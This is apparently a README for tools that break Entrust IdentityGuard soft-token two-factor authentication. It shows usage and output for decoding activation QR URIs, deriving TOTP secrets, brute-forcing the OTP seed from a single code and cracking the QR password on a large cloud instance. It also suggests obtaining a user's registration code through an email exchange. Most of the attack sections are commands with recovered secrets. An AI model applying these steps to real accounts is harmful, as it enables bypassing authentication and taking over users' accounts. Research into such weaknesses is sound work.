# entrust-identityguard-tools
Tools for playing with Entrust IdentityGuard soft tokens, such as decrypting QR codes and generating secrets

# decode-qr-uri.py
Run this with the URI from a QR code to recieve the decrypted data. The decrypted data can be later combined with a registration code to derive the TOTP secrets.

Example:
```
$ ./decode-qr-uri.py 'igmobileotp://?action=secactivate&enc=VRUq6IoLWQRCMRITZEHtHUSWJiPwgu%2FN1BFyUHE5kxuHIEYoE3zmNTrAHeeUM5S3gzCnTy%2F%2Bdnbu%2FsjjQW%2BNEISx8C4ra8rLpxOl8E8w4KXHgjeBRgdvSzl%2BbzX5RYRrQlWgK8hsBT4pQYE0eFgW2TmRbzXu1Mu7XjKDcwsJLew32jQC2qyPLP8hljnv2rHwwsMfhQwgJUJYfctwLWWEDUFukEckaZ4O&v=1&mac=mhVL8BWKaishMa5%2B' 54998317
{"sn":"48244-13456","ac":"1745-7712-6942-8698","policy":"{\"allowUnsecured\":\"false\",\"trustedExecution\":\"NOT_ALLOWED\"}","regurl":"myid.umc.edu\/igst"}
```

# generate-otp.py
Once you have the required information from a QR code, you can combine it with a "registration code" to derive the OTP secret. This registration code contains random bytes that were generated on the end-users device (their mobile phone), and are thus required to determine the OTP secret. An example way to obtain all of this information would be through email, if the user recieves a QR code in their email, then responds with their registration code.

The OTP secret optionally includes the policy specification, which is provided as part of the QR code. *If you are having problems generating a valid OTP secret, try with or without the policy parameter*.

Example:
```
$ ./generate-otp.py 48244-13456 1745-7712-6942-8698 12211-49352 --policy '{"allowUnsecured":"false","trustedExecution":"NOT_ALLOWED"}'
bb9b6d72ae99b006de5e106935ec96da

To generate a code immediately, run:
oathtool -v --totp=sha256 --digits=6 bb9b6d72ae99b006de5e106935ec96da

$ ./generate-otp.py 48244-13456 1745-7712-6942-8698 12211-49352
9a8eab5ecc9fc413758a92ac223dc6a0

To generate a code immediately, run:
oathtool -v --totp=sha256 --digits=6 9a8eab5ecc9fc413758a92ac223dc6a0

$ oathtool -v --totp=sha256 --digits=6 9a8eab5ecc9fc413758a92ac223dc6a0
Hex secret: 9a8eab5ecc9fc413758a92ac223dc6a0
Base32 secret: TKHKWXWMT7CBG5MKSKWCEPOGUA======
Digits: 6
Window size: 0
Step size (seconds): 30
Start time: 1970-01-01 00:00:00 UTC (0)
Current time: 2019-10-06 08:50:31 UTC (1570351831)
Counter: 0x31EB8E5 (52345061)

814835
```

# crack-otp.py
Because Entrust soft tokens only use 2 bytes of randomness generated on the end-user device, this means they're trivially bruteforcable given the original QR code and a single OTP output. Simply decode the QR code as usual, and provide it to the script along with an example OTP output and when it was generated. The script will do a sloppy match on the timing (+ and - 30 seconds) to improve the chances of a successful key being found, unless the `--strict-time` paramater is given which causes the script to do an search match.

The script is fast enough on a CPU that a CUDA/OpenCL implmentation is probably not necessary.

Example:
```
$ time ./crack-otp.py 48244-13456 1745-7712-6942-8698 043700 1570434609
Possibe valid OTP seed found:  9a8eab5ecc9fc413758a92ac223dc6a0
To generate a code immediately, run:
oathtool -v --totp=sha256 --digits=6 9a8eab5ecc9fc413758a92ac223dc6a0

real    0m3.540s
user    0m3.537s
sys     0m0.003s

$ time ./crack-otp.py 48244-13456 1745-7712-6942-8698 043700 1570434609 --strict-time
Possibe valid OTP seed found:  9a8eab5ecc9fc413758a92ac223dc6a0
To generate a code immediately, run:
oathtool -v --totp=sha256 --digits=6 9a8eab5ecc9fc413758a92ac223dc6a0

real    0m1.212s
user    0m1.209s
sys     0m0.003s
```

# crack-qr-uri.go
The QR code normally comes with a relatively weak password, along with a MAC that can verify the password. This allows us to perform a bruteforce of all possible passwords in a relatively short period, even with a CPU implementation. Simply run the script with the QR code URI as a parameter and it will discover the password.

Performance on with a single modern CPU core results in 0.720 seconds (approximately, of course) to perform 1000 password attempts. The keyspace exists from 0 to 99999999.

Example (AWS EC2 c5.metal instance - 96 cores):
```
$ time go run crack-qr-uri.go -uri 'igmobileotp://?action=secactivate&enc=VRUq6IoLWQRCMRITZEHtHUSWJiPwgu%2FN1BFyUHE5kxuHIEYoE3zmNTrAHeeUM5S3gzCnTy%2F%2Bdnbu%2FsjjQW%2BNEISx8C4ra8rLpxOl8E8w4KXHgjeBRgdvSzl%2BbzX5RYRrQlWgK8hsBT4pQYE0eFgW2TmRbzXu1Mu7XjKDcwsJLew32jQC2qyPLP8hljnv2rHwwsMfhQwgJUJYfctwLWWEDUFukEckaZ4O&v=1&mac=mhVL8BWKaishMa5%2B' -threads 95
action=secactivate&enc=VRUq6IoLWQRCMRITZEHtHUSWJiPwgu%2FN1BFyUHE5kxuHIEYoE3zmNTrAHeeUM5S3gzCnTy%2F%2Bdnbu%2FsjjQW%2BNEISx8C4ra8rLpxOl8E8w4KXHgjeBRgdvSzl%2BbzX5RYRrQlWgK8hsBT4pQYE0eFgW2TmRbzXu1Mu7XjKDcwsJLew32jQC2qyPLP8hljnv2rHwwsMfhQwgJUJYfctwLWWEDUFukEckaZ4O&v=1
Candidate password found:  54998317

real    67m23.690s
user    3047m42.788s
sys     870m1.228s
```

Thre is also an OpenCL version of this process which can be found at https://github.com/JJJollyjim/entrust-2fa-opencl, which can be further optimised if desired.
